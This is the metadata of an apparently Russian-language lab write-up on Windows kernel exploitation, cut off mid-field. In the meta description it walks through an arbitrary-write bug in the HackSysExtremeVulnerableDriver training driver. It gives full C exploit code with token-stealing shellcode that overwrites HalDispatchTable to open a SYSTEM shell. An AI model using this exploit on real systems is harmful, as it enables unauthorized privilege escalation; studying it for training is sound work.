<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
  <meta name="generator" content="Jekyll">

  <title>Windows Kernel Exploitation 0x02 | Arbitrary Write [ru]</title>

  <link rel="stylesheet" href="/css/main.css">
  <!-- <link href="assets/favicon.ico" rel="icon" type="image/x-icon" /> -->
  <link rel="shortcut icon" type="image/png" href="assets//favicon.png">
  <link href="/atom.xml" type="application/atom+xml" rel="alternate" title="ATOM Feed" /> <!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Windows Kernel Exploitation 0x02 Arbitrary Write [ru] | Windows Internals Blog</title>
<meta name="generator" content="Jekyll v4.3.3" />
<meta property="og:title" content="Windows Kernel Exploitation 0x02 Arbitrary Write [ru]" />
<meta name="author" content="truebad0ur" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="В следующей лабе видим структуру: link typedef struct _WRITE_WHAT_WHERE { PULONG_PTR What; PULONG_PTR Where; } WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE; А в конце: NTSTATUS TriggerArbitraryWrite( _In_ PWRITE_WHAT_WHERE UserWriteWhatWhere ); К сорцам: link Собственно запустим сплойт, посмотрим windbg: #include &lt;Windows.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x22200B const char kDevName[] = &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;; int main() { printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\n&quot;); char *poc = &quot;AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp&quot;; //printf(&quot;%d&quot;, sizeof(poc)); DWORD bytesRetn; printf(&quot;[+] Starting interaction with the driver\n&quot;); DeviceIoControl(hDevice, IO_CODE, poc, 100, NULL, 0, &amp;bytesRetn, NULL); //system(&quot;cmd.exe&quot;); CloseHandle(hDevice); return 0; } И получим: ****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ****** [+] UserWriteWhatWhere: 0x0040409C [+] WRITE_WHAT_WHERE Size: 0x8 [+] UserWriteWhatWhere-&gt;What: 0x41414141 [+] UserWriteWhatWhere-&gt;Where: 0x42424242 [+] Triggering Arbitrary Overwrite Break instruction exception - code 80000003 (first chance) HEVD!TriggerArbitraryOverwrite+0x5e: a8353b66 83c424 add esp,24h kd&gt; g [-] Exception Code: 0xC0000005 ****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ****** Собственно, что дальше-то? Сама дыра заключается в возможности писать произвольные данные по произвольному адресу. Обычно, возможности урезаются митигациями или в целом самой дырой (можно писать 1 байт / 1 бит / только по адресам выше N и тд) В самом коде показан способ защиты: проверка на то, что адреса из пространства ядра ProbeForRead((PVOID)What, sizeof(PULONG_PTR), (ULONG)__alignof(UCHAR)); ProbeForWrite((PVOID)Where, sizeof(PULONG_PTR), (ULONG)__alignof(UCHAR)); С msdn’а The ProbeForRead routine checks that a user-mode buffer actually resides in the user portion of the address space, and is correctly aligned. If the specified range of memory is not within the user-mode address range, ProbeForRead raises the STATUS_ACCESS_VIOLATION exception. В этот раз у нас нет возможности просто прыгнуть на код, адрес которого мы передадим. Нам нужно переписать кукую-то бесполезную функцию, которая редко вызывается, шеллкодом, и уже тогда она сама вызовется. Переписывать функцию будем в HalDispatchTable (Hardware Abstraction Layer Dispatch Table) nt!NtQueryIntervalProfile: 82921073 6a0c push 0Ch 82921075 68880c6682 push offset nt! ?? ::FNODOBFM::`string&#39;+0xd08 (82660c88) 8292107a e871b4d6ff call nt!_SEH_prolog4 (8268c4f0) 8292107f 64a124010000 mov eax,dword ptr fs:[00000124h] 82921085 8a983a010000 mov bl,byte ptr [eax+13Ah] 8292108b 84db test bl,bl 8292108d 743e je nt!NtQueryIntervalProfile+0x5a (829210cd) 8292108f 8365fc00 and dword ptr [ebp-4],0 82921093 8b750c mov esi,dword ptr [ebp+0Ch] 82921096 8bce mov ecx,esi 82921098 a154987782 mov eax,dword ptr [nt!MmUserProbeAddress (82779854)] 8292109d 3bf0 cmp esi,eax 8292109f 7202 jb nt!NtQueryIntervalProfile+0x30 (829210a3) 829210a1 8bc8 mov ecx,eax 829210a3 8b01 mov eax,dword ptr [ecx] 829210a5 8901 mov dword ptr [ecx],eax 829210a7 c745fcfeffffff mov dword ptr [ebp-4],0FFFFFFFEh 829210ae eb20 jmp nt!NtQueryIntervalProfile+0x5d (829210d0) 829210b0 8b45ec mov eax,dword ptr [ebp-14h] 829210b3 8b00 mov eax,dword ptr [eax] 829210b5 8b00 mov eax,dword ptr [eax] 829210b7 8945e4 mov dword ptr [ebp-1Ch],eax 829210ba 33c0 xor eax,eax 829210bc 40 inc eax 829210bd c3 ret 829210be 8b65e8 mov esp,dword ptr [ebp-18h] 829210c1 c745fcfeffffff mov dword ptr [ebp-4],0FFFFFFFEh 829210c8 8b45e4 mov eax,dword ptr [ebp-1Ch] 829210cb eb39 jmp nt!NtQueryIntervalProfile+0x93 (82921106) 829210cd 8b750c mov esi,dword ptr [ebp+0Ch] 829210d0 8b4508 mov eax,dword ptr [ebp+8] 829210d3 85c0 test eax,eax 829210d5 7507 jne nt!NtQueryIntervalProfile+0x6b (829210de) 829210d7 a1f48b7382 mov eax,dword ptr [nt!KiProfileInterval (82738bf4)] 829210dc eb05 jmp nt!NtQueryIntervalProfile+0x70 (829210e3) 829210de e88cbcfbff call nt!KeQueryIntervalProfile (828dcd6f) nt!KeQueryIntervalProfile: 828dcd6f 8bff mov edi,edi 828dcd71 55 push ebp 828dcd72 8bec mov ebp,esp 828dcd74 83ec10 sub esp,10h 828dcd77 83f801 cmp eax,1 828dcd7a 7507 jne nt!KeQueryIntervalProfile+0x14 (828dcd83) 828dcd7c a168407782 mov eax,dword ptr [nt!KiProfileAlignmentFixupInterval (82774068)] 828dcd81 c9 leave 828dcd82 c3 ret 828dcd83 8945f0 mov dword ptr [ebp-10h],eax 828dcd86 8d45fc lea eax,[ebp-4] 828dcd89 50 push eax 828dcd8a 8d45f0 lea eax,[ebp-10h] 828dcd8d 50 push eax 828dcd8e 6a0c push 0Ch 828dcd90 6a01 push 1 828dcd92 ff1544947382 call dword ptr [nt!HalDispatchTable+0x4 (82739444)] nt!HalDispatchTable --&gt; 82739440 Способы найти HalDispatchTable 1) Энумерируем все адреса драйверов с помощью EnumDeviceDrivers() 2) Ищем среди них адрес ntoskrnl (ntoskrnl.exe экспортирует KeQueryIntervalProfile()) 3) Передаем хендл на ntoskrnl.exe в LoadLibraryExA и затем энумерируем адрес HalDispatchTable с помощью GetProcAddress 4) Как только адрес HalDispatchTable найден, мы можем посчитать адрес HalDispatchTable + 0x4 (добавив 4 байта) и переписать адрес на адрес нашего шеллкода в юзерспейсе. 4 байта добавляем, потому что по структуре HalDispatchTable в первых 4/8 байтах версия #include &lt;Windows.h&gt; #include &lt;psapi.h&gt; #include &lt;tchar.h&gt; #include &lt;stdio.h&gt; #define ARRAY_SIZE 1024 int main() { LPVOID drivers[ARRAY_SIZE]; DWORD cbNeeded; int cDrivers, i; if (EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded) &amp; cbNeeded &lt; sizeof(drivers)) { TCHAR szDriver[ARRAY_SIZE]; cDrivers = cbNeeded / sizeof(drivers[0]); printf(&quot;There are %d drivers:\n&quot;, cDrivers); for (i = 0; i &lt; cDrivers; i++) { if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0]))) { //printf(&quot; - %ws - \n&quot;, (const WCHAR *)szDriver); //printf(&quot;%ls : %ls\n&quot;, szDriver, TEXT(&quot;ntkrnlpa.exe&quot;)); if (!wcscmp(szDriver, TEXT(&quot;ntkrnlpa.exe&quot;))) { printf(&quot;%p: %ls\n&quot;, drivers[i], szDriver); } //printf(&quot;Skipped!\n&quot;); } } } else { printf(&quot;EnumDeviceDrivers failed; array size needed is %d\n&quot;, cbNeeded / sizeof(LPVOID)); return 1; } return 0; } Get HalDispatchTable: for (i = 0; i &lt; cDrivers; i++) { if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0]))) { //printf(&quot; - %ws - \n&quot;, (const WCHAR *)szDriver); //printf(&quot;%ls : %ls\n&quot;, szDriver, TEXT(&quot;ntkrnlpa.exe&quot;)); if (!wcscmp(szDriver, TEXT(&quot;ntkrnlpa.exe&quot;))) { printf(&quot;[+] Kernel Image Base: %p\n&quot;, drivers[i]); HMODULE ntkrnlpaHandle = LoadLibraryExW(szDriver, 0, 0); PVOID HALUserLand = (PVOID)GetProcAddress(ntkrnlpaHandle, &quot;HalDispatchTable&quot;); printf(&quot;[+] HalDispatchTable userland: %p \n&quot;, HALUserLand); printf(&quot;\n\nHALUserLand: %p\nntkrnlpaHandle: %p\ndrivers[i]: %p\n\n&quot;, HALUserLand, &amp;ntkrnlpaHandle, drivers[i]); PVOID HalDispatchTable = (PVOID)((ULONG)drivers[i] - (ULONG)ntkrnlpaHandle + (ULONG)HALUserLand); //PVOID HalDispatchTable = HALUserLand – ntkrnlpaHandle + szDriver; printf(&quot;[~] HalDispatchTable Kernel: %p\n&quot;, HalDispatchTable); } //printf(&quot;Skipped!\n&quot;); } } Так как переписывать мы будем HalDispatchTable+4, прибавим ещё 4 в коде и напишем эксплойт #include &lt;Windows.h&gt; #include &lt;psapi.h&gt; #include &lt;tchar.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x22200B const char kDevName[] = &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;; #define ARRAY_SIZE 1024 int main() { __debugbreak(); LPVOID drivers[ARRAY_SIZE]; DWORD cbNeeded; int cDrivers, i; if (EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded) &amp; cbNeeded &lt; sizeof(drivers)) { TCHAR szDriver[ARRAY_SIZE]; cDrivers = cbNeeded / sizeof(drivers[0]); printf(&quot;There are %d drivers:\n&quot;, cDrivers); for (i = 0; i &lt; cDrivers; i++) { if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0]))) { //printf(&quot; - %ws - \n&quot;, (const WCHAR *)szDriver); //printf(&quot;%ls : %ls\n&quot;, szDriver, TEXT(&quot;ntkrnlpa.exe&quot;)); if (!wcscmp(szDriver, TEXT(&quot;ntkrnlpa.exe&quot;))) { printf(&quot;[+] Kernel Image Base: %p\n&quot;, drivers[i]); HMODULE ntkrnlpaHandle = LoadLibraryExW(szDriver, 0, 0); PVOID HALUserLand = (PVOID)GetProcAddress(ntkrnlpaHandle, &quot;HalDispatchTable&quot;); printf(&quot;[+] HalDispatchTable userland: %p \n&quot;, HALUserLand); printf(&quot;\n\nHALUserLand: %p\nntkrnlpaHandle: %p\ndrivers[i]: %p\n\n&quot;, HALUserLand, &amp;ntkrnlpaHandle, drivers[i]); PVOID HalDispatchTable = (PVOID)((ULONG)drivers[i] - (ULONG)ntkrnlpaHandle + (ULONG)HALUserLand + 4); //PVOID HalDispatchTable = HALUserLand – ntkrnlpaHandle + szDriver; printf(&quot;[~] HalDispatchTable Kernel: %p\n&quot;, HalDispatchTable); const char* shellcode = &quot;\x60\x31\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x89\xC1\xBA\x04\x00\x00\x00\x8B\x80\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x39\x90\xB4\x00\x00\x00\x75\xED\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\x61\x31\xC0\x5D\xC2\x08\x00&quot;; LPVOID shellc_ptr = VirtualAlloc(0, 58, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (shellc_ptr) memcpy(shellc_ptr, shellcode, 58); printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\n&quot;); char poc[113] = &quot;AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp&quot;; //printf(&quot;%d&quot;, sizeof(poc)); DWORD bytesRetn; LPVOID *var1 = &amp;shellc_ptr; poc[0] = ((unsigned char*)&amp;var1)[0]; poc[1] = ((unsigned char*)&amp;var1)[1]; poc[2] = ((unsigned char*)&amp;var1)[2]; poc[3] = ((unsigned char*)&amp;var1)[3]; poc[4] = ((unsigned char*)(&amp;HalDispatchTable))[0]; poc[5] = ((unsigned char*)(&amp;HalDispatchTable))[1]; poc[6] = ((unsigned char*)(&amp;HalDispatchTable))[2]; poc[7] = ((unsigned char*)(&amp;HalDispatchTable))[3]; //memcpy((void *) &amp;poc[0], HalDispatchTable, 0x4); //memcpy((void *) &amp;poc[4], &amp;shellc_ptr, 0x4); printf(&quot;[+] Starting interaction with the driver\n&quot;); DeviceIoControl(hDevice, IO_CODE, (LPVOID)poc, 100, NULL, 0, &amp;bytesRetn, NULL); system(&quot;cmd.exe&quot;); CloseHandle(hDevice); } //printf(&quot;Skipped!\n&quot;); } } } else { printf(&quot;EnumDeviceDrivers failed; array size needed is %d\n&quot;, cbNeeded / sizeof(LPVOID)); return 1; } return 0; } Допиливаем напёрстком сплойт, собираем шелл и Viola! #include &lt;Windows.h&gt; #include &lt;psapi.h&gt; #include &lt;tchar.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x22200B const char kDevName[] = &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;; #define ARRAY_SIZE 1024 int main() { __debugbreak(); LPVOID drivers[ARRAY_SIZE]; DWORD cbNeeded; int cDrivers, i; if (EnumDeviceDrivers(drivers, sizeof(drivers), &amp;cbNeeded) &amp; cbNeeded &lt; sizeof(drivers)) { TCHAR szDriver[ARRAY_SIZE]; cDrivers = cbNeeded / sizeof(drivers[0]); printf(&quot;There are %d drivers:\n&quot;, cDrivers); for (i = 0; i &lt; cDrivers; i++) { if (GetDeviceDriverBaseName(drivers[i], szDriver, sizeof(szDriver) / sizeof(szDriver[0]))) { //printf(&quot; - %ws - \n&quot;, (const WCHAR *)szDriver); //printf(&quot;%ls : %ls\n&quot;, szDriver, TEXT(&quot;ntkrnlpa.exe&quot;)); if (!wcscmp(szDriver, TEXT(&quot;ntkrnlpa.exe&quot;))) { printf(&quot;[+] Kernel Image Base: %p\n&quot;, drivers[i]); HMODULE ntkrnlpaHandle = LoadLibraryExW(szDriver, 0, 0); PVOID HALUserLand = (PVOID)GetProcAddress(ntkrnlpaHandle, &quot;HalDispatchTable&quot;); printf(&quot;[+] HalDispatchTable userland: %p \n&quot;, HALUserLand); printf(&quot;\n\nHALUserLand: %p\nntkrnlpaHandle: %p\ndrivers[i]: %p\n\n&quot;, HALUserLand, &amp;ntkrnlpaHandle, drivers[i]); PVOID HalDispatchTable = (PVOID)((ULONG)drivers[i] - (ULONG)ntkrnlpaHandle + (ULONG)HALUserLand + 4); //PVOID HalDispatchTable = HALUserLand – ntkrnlpaHandle + szDriver; printf(&quot;[~] HalDispatchTable Kernel: %p\n&quot;, HalDispatchTable); const char* shellcode = &quot;\x90\x90\x90\x90\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x61\x31\xc0\x83\xc4\x24\x5d\xc2\x08\x00&quot;; LPVOID shellc_ptr = VirtualAlloc(0, 65, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (shellc_ptr) memcpy(shellc_ptr, shellcode, 65); printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\n&quot;); char poc[113] = &quot;AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp&quot;; //printf(&quot;%d&quot;, sizeof(poc)); DWORD bytesRetn; LPVOID *var1 = &amp;shellc_ptr; poc[0] = ((unsigned char*)&amp;var1)[0]; poc[1] = ((unsigned char*)&amp;var1)[1]; poc[2] = ((unsigned char*)&amp;var1)[2]; poc[3] = ((unsigned char*)&amp;var1)[3]; poc[4] = ((unsigned char*)(&amp;HalDispatchTable))[0]; poc[5] = ((unsigned char*)(&amp;HalDispatchTable))[1]; poc[6] = ((unsigned char*)(&amp;HalDispatchTable))[2]; poc[7] = ((unsigned char*)(&amp;HalDispatchTable))[3]; //memcpy((void *) &amp;poc[0], HalDispatchTable, 0x4); //memcpy((void *) &amp;poc[4], &amp;shellc_ptr, 0x4); printf(&quot;[+] Starting interaction with the driver\n&quot;); DeviceIoControl(hDevice, IO_CODE, (LPVOID)poc, 100, NULL, 0, &amp;bytesRetn, NULL); CloseHandle(hDevice); HMODULE ntdll = GetModuleHandleA(&quot;ntdll&quot;); typedef NTSTATUS(NTAPI* PtrNtQueryIntervalProfile)( DWORD ProfileSource, PULONG Interval ); PtrNtQueryIntervalProfile _NtQueryIntervalProfile = (PtrNtQueryIntervalProfile)GetProcAddress(ntdll, &quot;NtQueryIntervalProfile&quot;); printf(&quot;[+] Address of NtQueryIntervalProfile: 0x%x.\n&quot;, _NtQueryIntervalProfile); ULONG whatever; _NtQueryIntervalProfile(2, &amp;whatever); system(&quot;cmd.exe&quot;); } //printf(&quot;Skipped!\n&quot;); } } } else { printf(&quot;EnumDeviceDrivers failed; array size needed is %d\n&quot;, cbNeeded / sizeof(LPVOID)); return 1; } return 0; } В самом конце у нас задача вызвать NtQueryIntervalProfile, что и происходит Если дебагать, можно поставить бряки на NtQueryIntervalProfile и nt!KeQueryIntervalProfile Статья Заметки: Билдил в студии на хосте, в дебаг моде эксплойт работает только под windbg, в релизной версии работает без дебаггера, думаю, из-за vs либ Не забывать osr loader’ом загружать драйвер, если при первой загрузке не поставил automatic В теории можно сохранять значение по адресу HalDispatchTable+0x4 и после получения шелла восстанавливать его обратно, чтобы винда не падала (это проиходит при ребуте, так что не важно), но мне лень :) Заметки:Следующий способ найти HalDispatchTable Воспользуемся NtQuerySystemInformation Фишка для windbg по пути: вот мы собираем какой-то юзермодный файлик, который будет к драйверу обращаться (например наш де код) и нам бы надо пересобрать .cpp и в том числе .pdb, но дескриптор на .pdb открыт, мы его подгрузили в windbg. Можно выгрузить модули с помощью .reload /u перекомпилить код и загрузить снова .sympath+ C:\path\to\pdb\file; .reload Если хотим глядеть сорцы в windbg, надо сначала прожать File –&gt; Open Source File, когда стоплнулся код на брейлпоинте в проге, а уже потом прописать .reload и всё будет работать: Нет активной отладки в сорцах, но в дизасме прога стопнулась: .reload и подключилась активная отладка: И так, к NtQuerySystemInformation Код получился вот такой: #include &lt;Windows.h&gt; #include &lt;psapi.h&gt; #include &lt;tchar.h&gt; #include &lt;stdio.h&gt; #define MAXIMUM_FILENAME_LENGTH 255 #define IO_CODE 0x22200B const char kDevName[] = &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;; int main() { __debugbreak(); typedef struct SYSTEM_MODULE { ULONG Reserved1; ULONG Reserved2; PVOID ImageBaseAddress; ULONG ImageSize; ULONG Flags; WORD Id; WORD Rank; WORD w018; WORD NameOffset; BYTE Name[MAXIMUM_FILENAME_LENGTH]; }SYSTEM_MODULE, * PSYSTEM_MODULE; typedef struct SYSTEM_MODULE_INFORMATION { ULONG ModulesCount; SYSTEM_MODULE Modules[1]; } SYSTEM_MODULE_INFORMATION, * PSYSTEM_MODULE_INFORMATION; typedef enum _SYSTEM_INFORMATION_CLASS { SystemModuleInformation = 11, SystemHandleInformation = 16 } SYSTEM_INFORMATION_CLASS; ULONG len = 0; PSYSTEM_MODULE_INFORMATION pModuleInfo; NTSTATUS WINAPI NtQuerySystemInformation( _In_ SYSTEM_INFORMATION_CLASS SystemInformationClass, _Inout_ PVOID SystemInformation, _In_ ULONG SystemInformationLength, _Out_opt_ PULONG ReturnLength ); typedef NTSTATUS(WINAPI* PNtQuerySystemInformation)( __in SYSTEM_INFORMATION_CLASS SystemInformationClass, __inout PVOID SystemInformation, __in ULONG SystemInformationLength, __out_opt PULONG ReturnLength ); HMODULE ntdll = GetModuleHandle(L&quot;ntdll&quot;); PNtQuerySystemInformation query = (PNtQuerySystemInformation)GetProcAddress(ntdll, &quot;NtQuerySystemInformation&quot;); if (query == NULL) { wprintf(L&quot;[!] GetModuleHandle Failed\n&quot;); return 1; } query(SystemModuleInformation, NULL, 0, &amp;len); pModuleInfo = (PSYSTEM_MODULE_INFORMATION)GlobalAlloc(GMEM_ZEROINIT, len); if (pModuleInfo == NULL) { wprintf(L&quot;[!] Failed to allocate memory\n&quot;); return 1; } query(SystemModuleInformation, pModuleInfo, len, &amp;len); if (!len) { wprintf(L&quot;[!] Failed to retrieve system module information\n&quot;); return 1; } PVOID kernelImageBase = pModuleInfo-&gt;Modules[0].ImageBaseAddress; PCHAR kernelImage = (PCHAR)pModuleInfo-&gt;Modules[0].Name; kernelImage = strrchr(kernelImage, &#39;\\&#39;) + 1; wprintf(L&quot;[+] Kernel Image name %S\n&quot;, kernelImage); wprintf(L&quot;[+] Kernel Image Base %p\n&quot;, kernelImageBase); HMODULE KernelHandle = LoadLibraryA(kernelImage); wprintf(L&quot;[+] Kernel Handle %p\n&quot;, KernelHandle); PVOID HALUserLand = (PVOID)GetProcAddress(KernelHandle, &quot;HalDispatchTable&quot;); wprintf(L&quot;[+] HalDispatchTable userland %p\n&quot;, HALUserLand); PVOID HalDispatchTable = (PVOID)((ULONG)kernelImageBase - (ULONG)KernelHandle + (ULONG)HALUserLand + 4); wprintf(L&quot;[~] HalDispatchTable Kernel %p\n&quot;, HalDispatchTable); printf(&quot;[~] HalDispatchTable Kernel: %p\n&quot;, HalDispatchTable); const char* shellcode = &quot;\x90\x90\x90\x90\x60\x31\xc0\x64\x8b\x80\x24\x01\x00\x00\x8b\x40\x50\x89\xc1\xba\x04\x00\x00\x00\x8b\x80\xb8\x00\x00\x00\x2d\xb8\x00\x00\x00\x39\x90\xb4\x00\x00\x00\x75\xed\x8b\x90\xf8\x00\x00\x00\x89\x91\xf8\x00\x00\x00\x61\x31\xc0\x83\xc4\x24\x5d\xc2\x08\x00&quot;; LPVOID shellc_ptr = VirtualAlloc(0, 65, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE); if (shellc_ptr) memcpy(shellc_ptr, shellcode, 65); printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\n&quot;); char poc[113] = &quot;AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp&quot;; DWORD bytesRetn; LPVOID *var1 = &amp;shellc_ptr; poc[0] = ((unsigned char*)&amp;var1)[0]; poc[1] = ((unsigned char*)&amp;var1)[1]; poc[2] = ((unsigned char*)&amp;var1)[2]; poc[3] = ((unsigned char*)&amp;var1)[3]; poc[4] = ((unsigned char*)(&amp;HalDispatchTable))[0]; poc[5] = ((unsigned char*)(&amp;HalDispatchTable))[1]; poc[6] = ((unsigned char*)(&amp;HalDispatchTable))[2]; poc[7] = ((unsigned char*)(&amp;HalDispatchTable))[3]; printf(&quot;[+] Starting interaction with the driver\n&quot;); DeviceIoControl(hDevice, IO_CODE, (LPVOID)poc, 100, NULL, 0, &amp;bytesRetn, NULL); CloseHandle(hDevice); //HMODULE ntdll = GetModuleHandleA(&quot;ntdll&quot;); typedef NTSTATUS(NTAPI* PtrNtQueryIntervalProfile)(DWORD ProfileSource, PULONG Interval); PtrNtQueryIntervalProfile _NtQueryIntervalProfile = (PtrNtQueryIntervalProfile)GetProcAddress(ntdll, &quot;NtQueryIntervalProfile&quot;); printf(&quot;[+] Address of NtQueryIntervalProfile: 0x%x.\n&quot;, _NtQueryIntervalProfile); ULONG whatever; _NtQueryIntervalProfile(2, &amp;whatever); system(&quot;cmd.exe&quot;); return 0; } Статья Сорцы" />
<meta property="og:description" content="В следующей лабе видим структуру: link typedef struct _WRITE_WHAT_WHERE { PULONG_PTR What; PULONG_PTR Where; } WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE; А в конце: NTSTATUS TriggerArbitraryWrite( _In_ PWRITE_WHAT_WHERE UserWriteWhatWhere ); К сорцам: link Собственно запустим сплойт, посмотрим windbg: #include &lt;Windows.h&gt; #include &lt;string.h&gt; #include &lt;stdio.h&gt; #define IO_CODE 0x22200B const char kDevName[] = &quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;; int main() { printf(&quot;[+] Calling CreateFileA() to obtain a handle to driver\n&quot;); HANDLE hDevice = CreateFileA(kDevName, GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL ); if (hDevice == INVALID_HANDLE_VALUE) { printf(&quot;[-] Error - dailed to get file handle!\n&quot;); system(&quot;pause&quot;); return -1; } printf(&quot;[+] Successfully obtained a handle to the driver\n&quot;); char *poc = &quot;AAAABBBB222233334444555566667777888899990000zzzzxxxxccccvvvvbbbbnnnnmmmmaaaassssddddffffgggghhhhjjjjkkkkllllpppp&quot;; //printf(&quot;%d&quot;, sizeof(poc)); DWORD bytesRetn; printf(&quot;[+] Starting interaction with the driver\n&quot;); DeviceIoControl(hDevice, IO_CODE, poc, 100, NULL, 0, &amp;bytesRetn, NULL); //system(&quot;cmd.exe&quot;); CloseHandle(hDevice); return 0; } И получим: ****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ****** [+] UserWriteWhatWhere: 0x0040409C [+] WRITE_WHAT_WHERE Size: 0x8 [+] UserWriteWhatWhere-&gt;What: 0x41414141 [+] UserWriteWhatWhere-&gt;Where: 0x42424242 [+] Triggering Arbitrary Overwrite Break instruction exception - code 80000003 (first chance) HEVD!TriggerArbitraryOverwrite+0x5e: a8353b66 83c424 add esp,24h kd&gt; g [-] Exception Code: 0xC0000005 ****** HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE ****** Собственно, что дальше-то? Сама дыра заключается в возможности писать произвольные данные по произвольному адресу. Обычно, возможности урезаются митигациями или в целом самой дырой (можно писать 1 байт / 1 бит / только по адресам выше N и тд) В самом коде показан способ защиты: проверка на то, что адреса из пространства ядра ProbeForRead((PVOID)What, sizeof(PULONG_PTR), (ULONG)__alignof(UCHAR)); ProbeForWrite((PVOID)Where, sizeof(PULONG_PTR), (ULONG)__alignof(UCHAR)); С msdn’а The ProbeForRead routine checks that a user-mode buffer actually resides in the user portion of the address space, and is correctly aligned. If the specified range of memory is not within the user-mode address range, ProbeForRead raises the STATUS_ACCESS_VIOLATION exception. В этот раз у нас нет возможности просто прыгнуть на код, адрес которого мы передадим. Нам нужно переписать кукую-то бесполезную функцию, которая редко вызывается, шеллкодом, и уже тогда она сама вызовется. Переписывать функцию будем в HalDispatchTable (Hardware Abstraction Layer Dispatch Table) nt!NtQueryIntervalProfile: 82921073 6a0c push 0Ch 82921075 68880c6682 push offset nt! ?? ::FNODOBFM::`string&#39;+0xd08 (82660c88) 8292107a e871b4d6ff call nt!_SEH_prolog4 (8268c4f0) 8292107f 64a124010000 mov eax,dword ptr fs:[00000124h] 82921085 8a983a010000 mov bl,byte ptr [eax+13Ah] 8292108b 84db test bl,bl 8292108d 743e je nt!NtQueryIntervalProfile+0x5a (829210cd) 8292108f 8365fc00 and dword ptr [ebp-4],0 82921093 8b750c mov esi,dword ptr [ebp+0Ch] 82921096 8bce mov ecx,esi 82921098 a154987782 mov eax,dword ptr [nt!MmUserProbeAddress (82779854)] 8292109d 3bf0 cmp esi,eax 8292109f 7202 jb nt!NtQueryIntervalProfile+0x30 (829210a3) 829210a1 8bc8 mov ecx,eax 829210a3 8b01 mov eax,dword ptr [ecx] 829210a5 8901 mov dword ptr [ecx],eax 829210a7 c745fcfeffffff mov dword ptr [ebp-4],0FFFFFFFEh 829210ae eb20 jmp nt!NtQueryIntervalProfile+0x5d (829210d0) 829210b0 8b45ec mov eax,dword ptr [ebp-14h] 829210b3 8b00 mov eax,dword ptr [eax] 829210b5 8b00 mov eax,dword ptr [eax] 829210b7 8945e4 mov dword ptr [ebp-1Ch],eax 829210ba 33c0 xor eax,eax 829210bc 40 inc eax 829210bd c3 ret 829210be 8b65e8 mov esp,dword ptr [ebp-18h] 829210c1 c745fcfeffffff mov dword ptr [ebp-4],0FFFFFFFEh 829210c8 8b45e4 mov eax,dword ptr 